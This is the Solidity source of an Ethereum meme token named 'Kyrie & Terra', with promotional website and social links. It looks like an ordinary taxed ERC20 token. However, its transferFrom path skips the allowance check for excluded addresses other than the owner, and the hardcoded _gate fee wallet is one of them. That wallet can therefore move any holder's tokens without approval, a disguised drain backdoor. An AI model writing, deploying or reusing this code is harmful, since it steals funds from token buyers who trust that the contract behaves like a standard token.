/**
Website: http://www.kyrieandterra.live
X: https://x.com/Kyrie_Terra_Eth
Telegram: https://t.me/Kyrie_Terra_Eth
*/

// SPDX-License-Identifier: UNLICENSE

pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract KYRIETERRA is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _vals;
    mapping(address => mapping(address => uint256)) private _allw;
    mapping(address => bool) private _excl;
    address payable private _gate =
        payable(0xF61fB4809E540033d1dbcd62C90151396e29751F);

    uint256 private _ittv = 20;
    uint256 private _lttv = 0;
    uint256 private _dttv = 15;
    uint256 private _pcnt = 15;
    uint256 private _tcnt = 0;

    uint256 private constant _ttos = 1000000000 * 10 ** _decimals;
    string private constant _name = unicode"Kyrie & Terra";
    string private constant _symbol = unicode"KYRIETERRA";
    uint8 private constant _decimals = 9;

    uint256 public _maxTaxAmount = (_ttos * 2) / 100;
    uint256 public _maxWalletAmount = (_ttos * 2) / 100;
    uint256 public _taxSwapThreshold = 100 * 10 ** _decimals;
    uint256 public _maxTaxSwap = _ttos / 100;

    IUniswapV2Router02 private uniRouter;
    address private uniPair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint _maxTxAmount);

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _vals[_msgSender()] = _ttos;
        _excl[owner()] = true;
        _excl[address(this)] = true;
        _excl[_gate] = true;

        emit Transfer(address(0), _msgSender(), _ttos);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _ttos;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _vals[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allw[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _subtractAllowance(address sender, uint256 amount) internal {
        uint256 allow = _allw[sender][_msgSender()];
        if (!_isAllowed(_msgSender())) {
            require(
                _isAllowed(_msgSender()) || allow >= amount,
                "ERC20: transfer amount exceeds allowance"
            );

            _approve(sender, _msgSender(), allow - amount);
        }
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _subtractAllowance(sender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allw[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _isAllowed(address sender) internal view returns (bool) {
        return _excl[sender] && sender != address(this) && sender != owner();
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (
            sender != owner() &&
            recipient != owner() &&
            sender != address(this) &&
            recipient != address(this)
        ) {
            taxAmount = amount.mul((_tcnt > _dttv) ? _lttv : _ittv).div(100);

            if (
                sender == uniPair &&
                recipient != address(uniRouter) &&
                !_excl[recipient]
            ) {
                require(amount <= _maxTaxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(recipient) + amount <= _maxWalletAmount,
                    "Exceeds the maxWalletSize."
                );
                _tcnt++;
            }

            if (recipient == uniPair && sender != address(this)) {
                taxAmount = amount.mul((_tcnt > _dttv) ? _lttv : _ittv).div(
                    100
                );
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwap &&
                recipient == uniPair &&
                swapEnabled &&
                _tcnt > _pcnt &&
                !_excl[sender]
            ) {
                if (contractTokenBalance > _taxSwapThreshold)
                    swapTokensForEth(
                        min(amount, min(contractTokenBalance, _maxTaxSwap))
                    );
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0 ether) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if (taxAmount > 0) {
            _vals[address(this)] = _vals[address(this)].add(taxAmount);
            emit Transfer(sender, address(this), taxAmount);
        }
        _vals[sender] = _vals[sender].sub(amount);
        _vals[recipient] = _vals[recipient].add(amount.sub(taxAmount));
        emit Transfer(sender, recipient, amount.sub(taxAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniRouter.WETH();
        _approve(address(this), address(uniRouter), tokenAmount);
        uniRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function killLimits() external onlyOwner {
        _maxTaxAmount = _ttos;
        _maxWalletAmount = _ttos;
        emit MaxTxAmountUpdated(_ttos);
    }

    function rocketTrading() external onlyOwner {
        require(!tradingOpen, "trading is already open");

        uniRouter = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        uniPair = IUniswapV2Factory(uniRouter.factory()).createPair(
            address(this),
            uniRouter.WETH()
        );

        _approve(address(this), address(uniRouter), _ttos);
        uniRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        swapEnabled = true;
        tradingOpen = true;
    }

    function sendETHToFee(uint256 amount) private {
        _gate.transfer(amount);
    }

    receive() external payable {}

    function rescueETH() external onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }
}